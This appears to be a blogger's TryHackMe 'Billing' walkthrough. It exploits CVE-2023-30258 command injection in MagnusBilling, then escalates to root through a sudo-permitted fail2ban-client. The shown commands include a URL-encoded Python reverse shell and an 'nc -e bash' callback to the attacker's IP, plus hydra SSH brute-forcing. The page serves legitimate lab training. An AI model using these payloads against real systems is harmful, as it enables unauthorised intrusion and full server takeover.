---
layout: page
title: Billing
description: Exploited HTTP parameter for command injection
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/billing/logo.png" title="THM Billing Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/billing">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Logged in today and noticed a new box in the recent rooms.  Let's give it a whirl.

Per the usual, run nmap to get a list of the services running on top ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.121.180
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 18:20 AEDT
Nmap scan report for 10.10.121.180
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.121.180/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   7.80 ms   10.4.0.1
2   ... 3
4   261.55 ms 10.10.121.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds
```
{% endraw %}

<br />
Run nmap's vuln category scripts.  I like to look for low-hangin fruit.  Why not?

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ sudo nmap --script vuln -oN vulnchk 10.10.121.180
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 18:21 AEDT
Nmap scan report for 10.10.121.180
Host is up (0.35s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 67.65 seconds
```
{% endraw %}

<br />
Run nmap for udp.  I am a completionist, after all.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ sudo nmap -sU -oN nmapudp 10.10.121.180   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 18:21 AEDT
Nmap scan report for 10.10.121.180
Host is up (0.29s latency).
Not shown: 994 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
123/udp  open          ntp
631/udp  open|filtered ipp
5000/udp open|filtered upnp
5060/udp open          sip
5353/udp open|filtered zeroconf

Nmap done: 1 IP address (1 host up) scanned in 1098.72 seconds
```
{% endraw %}

<br />
Run curl -I to try and finger-print any technologies.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ curl -I http://10.10.121.180
HTTP/1.1 302 Found
Date: Sat, 08 Mar 2025 07:23:48 GMT
Server: Apache/2.4.56 (Debian)
Location: ./mbilling
Content-Type: text/html; charset=UTF-8
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run curl -I to try and finger-print any technologies.

{% raw %}
```html
view-source:http://10.10.121.180/mbilling/

<!DOCTYPE HTML>
<html manifest="cache.appcache">
    <head>
        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
        <meta charset="utf-8"/>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
        <link href="resources/images/logo.ico" rel="shortcut icon" type="image/x-icon"/>

<snip>

    </body>
</html>
```
{% endraw %}

<br />
Check the robots.txt file for anything interesting.

{% raw %}
```html
http://10.10.121.180/robots.txt

User-agent: *
Disallow: /mbilling/
```
{% endraw %}

<br />
Check the loading screen that appears briefly before the landing page loads.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/splash.png" title="Splash Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Google machine for MagnusBilling from the splash screen.  Discover CVE-2023-30258.  It appears that lib/icepay/icepay.php has a parameter called democ that gets executed.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/cve.png" title="Discover CVE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258">https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258</a>

<br />
Play with the curl command from the article to achieve command injection.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ curl -I http://10.10.121.180/mbilling/lib/icepay/icepay.php?democ=iamhacked;id;#'        
HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 08:43:51 GMT
Server: Apache/2.4.56 (Debian)
Content-Type: text/html; charset=UTF-8

uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),113(wireshark),116(bluetooth),129(scanner),136(vboxsf),137(kaboxer)
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ sudo nc -nlvp 443                      
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use revshells to generate a one-liner payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Take the url from the curl command from earlier, replace the id with the revshells, and plop it in the browser.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/browserattack.png" title="Browser Attack" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
http://10.10.121.180/mbilling/lib/icepay/icepay.php?democ=iamhacked;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.4.119.29%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27;#'
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.121.180] 36966
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```
{% endraw %}

<br />
Run sudo -l to get a list of commands that can be run as sudo.

{% raw %}
```bash
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo -l
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
{% endraw %}

<br />
Check the manpage for fail2ban-client.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/manpage.png" title="ManPage" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://linux.die.net/man/1/fail2ban-client">https://linux.die.net/man/1/fail2ban-client</a>

<br />
Research fail2ban-client for any privilege escalation techniques that currently exist.  Decent starting point.  However, we don't appear to have write privileges into the file for this to work.  Time to keep looking.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/billing/privesc.png" title="PrivEsc Research" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49">https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49</a>

<br />
Start another netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
```
{% endraw %}

<br />
Check the output from the help for fail2ban-client on how to update the commands that will be run on a ban.

{% raw %}
```bash
<snip>

                                             COMMAND ACTION CONFIGURATION
    set <JAIL> action <ACT> actionstart <CMD>
                                             sets the start command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionstop <CMD> sets the stop command <CMD> of the
                                             action <ACT> for <JAIL>
    set <JAIL> action <ACT> actioncheck <CMD>
                                             sets the check command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionban <CMD>  sets the ban command <CMD> of the
                                             action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionunban <CMD>
                                             sets the unban command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> timeout <TIMEOUT>
                                             sets <TIMEOUT> as the command
                                             timeout in seconds for the action
                                             <ACT> for <JAIL>

<snip>
```
{% endraw %}

<br />
Check the /etc/fail2ban/jail.conf file to find the necessary action and jail we will need to update the iptable-multiport with a reverse shell.

{% raw %}
```bash
#
# WARNING: heavily refactored in 0.9.0 release.  Please review and
#          customize settings for your setup.
#
# Changes:  in most of the cases you should not modify this
#           file, but provide customizations in jail.local file,
#           or separate .conf files under jail.d/ directory, e.g.:
#
# HOW TO ACTIVATE JAILS:

<snip>

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports

<snip>

#
# SSH servers
#

[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s

<snip>
```
{% endraw %}

<br />
Run the command from the help to set the jail, action, and command with sshd and iptables-multiport.

{% raw %}
```bash
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban '/usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444'
<ban '/usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444'
/usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444
```
{% endraw %}

<br />
Run hydra to trigger the fail2ban response.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.200.93 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 22:13:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking ssh://10.10.200.93:22/
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/billing]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.200.93] 36292
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
cat /root/root.txt
<redacted>
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:e9:a9:71:e6:0f brd ff:ff:ff:ff:ff:ff
    altname enp0s5
    altname ens5
    inet 10.10.200.93/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3349sec preferred_lft 3349sec
    inet6 fe80::e9:a9ff:fe71:e60f/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
cat /home/magnus/user.txt
<redacted>
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:e9:a9:71:e6:0f brd ff:ff:ff:ff:ff:ff
    altname enp0s5
    altname ens5
    inet 10.10.200.93/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3323sec preferred_lft 3323sec
    inet6 fe80::e9:a9ff:fe71:e60f/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Interesting little box, I think.  Hopefully, you liked it too.  See you in the next one.